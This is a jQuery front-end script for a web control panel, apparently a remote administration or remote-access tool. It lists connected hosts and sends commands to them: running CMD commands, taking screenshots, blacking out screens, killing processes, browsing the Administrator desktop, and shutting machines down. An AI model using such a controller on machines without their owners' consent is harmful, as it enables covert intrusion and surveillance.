$(function(){
	//绑定按钮事件
	$("#but_disk").live('click',function(){ GET_DATA('GET_DISK',0,0,$(this).html(),1); });
	$("#but_desk").live('click',function(){
		GET_DATA('GET_RPATH','C:\\Documents and Settings\\Administrator\\桌面',0,$(this).html(),1); });
	//<><><><><><>
	$("#but_SYS_LOGOFF").live('click',function(){ GET_DATA('SYS_LOGOFF',0,0,$(this).html(),0); });
	$("#but_SYS_REBOOT").live('click',function(){ GET_DATA('SYS_REBOOT',0,0,$(this).html(),0); });
	$("#but_SYS_SHUTDOWN").live('click',function(){ GET_DATA('SYS_SHUTDOWN',0,0,$(this).html(),0); });
	//<><><><><><>
	//任务管理器
	$("#but_tasklist").live('click',function(){ GET_DATA('TASK_LIST',0,0,$(this).html(),1); });
	$("#window_tasklist .del").live('click',function(){
		CMD =$(this).parent().attr('CMD');
		KEY1=$(this).parent().attr('KEY1');
		KEY2=$(this).parent().attr('KEY2');
		GET_DATA('TASK_KILL',KEY1,KEY2,'删除进程:'+KEY1,0);
		});
	//截屏
	$("#but_screen").live('click',function(){ GET_DATA('GET_SCREEN',0,0,$(this).html(),1); });
	//黑屏
	$("#but_black").live('click',function(){ GET_DATA('TO_BLACK',0,0,$(this).html(),0); });
	//执行CMD命令
	$("#cmd_but").live('click',function(){
		var NOTE = $(this).html();
		var CMD  = $('#cmd_box').text();
		GET_DATA('RUN_CMD',CMD,0,NOTE,1);
		});
	//打开网页
	$("#web_but").live('click',function(){
		var NOTE = $(this).html();
		var URL  = $('#web_box').text();
		GET_DATA('OPEN_WEB',URL,0,NOTE,0);
		});
	//弹出消息
	$("#msg_but").live('click',function(){
		var NOTE = $(this).html();
		var MSG  = $('#msg_box').text();
		GET_DATA('OPEN_MSG',MSG,0,NOTE,0);
		});
	//<><><><><><>
	$("#navpath_link a").live('click',function(){
		var THISPATH = $(this).attr("path");
		GET_DATA('GET_RPATH',THISPATH,'','正打开目录...',1);
	 });
	
});

//获取数据
function GET_DATA(CMD,KEY1,KEY2,NOTE,LOAD){
	$("#STAT_NOTE").html(NOTE);
	if(LOAD==1){$("#window_box").html('<div class="loading">&nbsp;</div>');}
	SEND_DATA(CMD,KEY1,KEY2);
	}

//提交并解析返回数据
function SEND_DATA(CMD,KEY1,KEY2){
  var keys;
  keys='?CMD='+CMD+'&KEY1='+KEY1+'&KEY2='+KEY2+'&T='+Math.random();
  $.ajax({type:'GET',url:'action.asp'+keys,dataType:'json',
      success:function(J){
		  if(J!=null){
			switch (J.CMD){
			  case 'ERR_MSG':
					alert(J.INFO);
					$('#STAT_NOTE').text(J.INFO);
					break;
			  case 'HOST_LIST':
					$("#list_host").html(J.INFO);
					var host_num = $("#list_host .item").size();
					$(".top_host_box a span").html(host_num);
					break;
			  case 'HOST_INFO':
					$("#navpath").val(J.navpath);
					$("#navpath_link").html(J.navpath_link);
					$("#on_macMD5").val(J.macMD5);
					$(".top_host_info").html(J.hostinfo);
					break;
			}
		  }
	  }});
  }


//提交并解析返回数据
function CMD_DATA(){
  $.ajax({type:'GET',url:'cmd.asp?T='+Math.random(),dataType:'json',
	  success:function(J){
		  if(J!=null){

			switch (J.CMD){
			  case 'ERR_MSG':
					alert(J.INFO);$('#STAT_NOTE').text(J.INFO);break;
			  case 'GET_DISK':
			  case 'GET_RPATH':
			        $('#STAT_NOTE').text('成功列出目录信息!');
			  case 'GET_SCREEN':
					$("#window_box").html(J.INFO);break;
			  case 'GET_RFILE':
					$("#window_box").html(J.INFO);break;
			  case 'STAT_MSG':
			  case 'SYS_LOGOFF':
			  case 'SYS_REBOOT':
			  case 'SYS_SHUTDOWN':
			  case 'OPEN_MSG':
			  case 'TO_BLACK':
					$('#STAT_NOTE').text(J.INFO);break;
			  case 'TASK_LIST':
			        $("#window_box").html(J.INFO);
					$.XYTipsWindow({
						___boxID:"tasklist_box",
						___title:"任务管理器",___content:"id:window_box",
						___showbg:false,___drag:"___boxTitle",___width:"450",___height:"380",
						___boxBdColor:"#333",___boxBdOpacity:"0.5",___boxWrapBdColor:"#000"
					});
					break;
			  case 'TASK_KILL':
			        $('#STAT_NOTE').text('成功删除进程:'+J.INFO);
			        $("#window_tasklist").find("#TASK_"+J.INFO).fadeOut(200);break;
			  case 'RUN_CMD':
					$("#window_box").html(J.INFO);break;
			  case 'OPEN_WEB':
					$('#STAT_NOTE').text(J.INFO);
					$("#window_box").html(J.INFO);break;
			  default :   
					alert(J.INFO);break;
			}
		  }
	  }});
	}
